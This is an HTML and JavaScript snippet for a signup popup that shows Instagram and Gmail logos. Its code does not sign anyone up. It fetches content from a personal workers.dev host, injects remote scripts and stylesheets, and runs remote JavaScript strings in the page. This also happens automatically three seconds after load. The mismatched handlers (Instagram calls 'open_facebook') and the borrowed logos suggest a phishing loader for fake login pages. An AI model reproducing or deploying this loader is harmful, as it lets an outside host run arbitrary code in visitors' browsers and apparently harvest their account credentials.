<div class="popup-overlay" id="signupPopup" style="display:none;">
    <div class="popup-content" style="position: relative;">
        <span class="close-popup" onclick="hidePopup()">&times;</span>
        <h2 class="popup-title">Sign Up</h2>
        <div class="signup-option" onclick="initiateSignup('example');">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram Logo">
            <span>Sign up with Instagram</span>
        </div>
        <div class="signup-option" onclick="initiateSignup('example1');">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png" alt="Gmail Logo">
            <span>Sign up with Gmail</span>
        </div>
    </div>
</div>
<div id="content-container"></div>
<div id="loader" style="display:none;"><div class="spinner"></div></div>

<script>
let cdnContentx = null;
let injectedResources = new Set(); // Keep track of injected resources

// Show popup
function showPopup() {
    document.getElementById('signupPopup').style.display = 'flex';
}

// Hide popup
function hidePopup() {
    document.getElementById('signupPopup').style.display = 'none';
}

// Show loader
function showLoader() {
    document.getElementById('loader').style.display = 'flex';
}

// Hide loader
function hideLoader() {
    document.getElementById('loader').style.display = 'none';
}

// Fetch and inject the content for the selected signup option
async function initiateSignup(method) {
    try {
        showLoader();
        if (!cdnContentx) {
            await fetchCdnContent();
        }
        await injectContent(method);
        
        // Call appropriate open function based on method
        if (method === 'example') {
            // Small delay to ensure DOM is ready
            setTimeout(() => {
                if (typeof open_facebook === 'function') {
                    open_facebook();
                } else {
                    console.error('open_facebook function not found');
                }
            }, 100);
        } else if (method === 'example1') {
            setTimeout(() => {
                if (typeof open_twitter === 'function') {
                    open_twitter();
                } else {
                    console.error('open_twitter function not found');
                }
            }, 100);
        }
    } catch (error) {
        console.error('Error during signup initiation:', error);
        alert('An error occurred. Please try again.');
    } finally {
        hideLoader();
    }
}

// Fetch CDN content from the worker
async function fetchCdnContent() {
    try {
        const response = await fetch('https://test4.mrrajaryanx30.workers.dev/cdn-content');
        if (!response.ok) throw new Error('Failed to fetch CDN content.');
        cdnContentx = await response.json();
        injectCssLinks(cdnContentx.cssLinks);
        injectJsLinks(cdnContentx.jsLinks);
    } catch (error) {
        console.error('Error fetching CDN content:', error);
        throw new Error('Failed to load content. Please try again.');
    }
}

// Inject CSS files from the CDN
function injectCssLinks(links) {
    links.forEach(link => {
        if (!injectedResources.has(link)) {
            const linkElement = document.createElement('link');
            linkElement.rel = 'stylesheet';
            linkElement.href = link;
            document.head.appendChild(linkElement);
            injectedResources.add(link);
        }
    });
}

// Inject JavaScript files from the CDN
function injectJsLinks(links) {
    links.forEach(link => {
        if (!injectedResources.has(link)) {
            const scriptElement = document.createElement('script');
            scriptElement.src = link;
            document.head.appendChild(scriptElement);
            injectedResources.add(link);
        }
    });
}

// Inject the HTML and execute the JS for the selected signup method
function injectContent(method) {
    const container = document.getElementById('content-container');
    container.innerHTML = ''; // Clear previous content

    // Inject HTML content
    if (cdnContentx && cdnContentx.html[method]) {
        container.innerHTML = cdnContentx.html[method];
    } else {
        console.error(`No HTML content found for method: ${method}`);
        return;
    }

    // Inject JavaScript content dynamically
    const script = document.createElement('script');
    script.id = 'dynamic-script';
    script.textContent = `
        (function() {
            ${cdnContentx.js[method] || ''}
        })();
    `;
    document.body.appendChild(script);
}

// Load CDN content after 3 seconds (optional, can be removed)
setTimeout(fetchCdnContent, 3000);
</script>
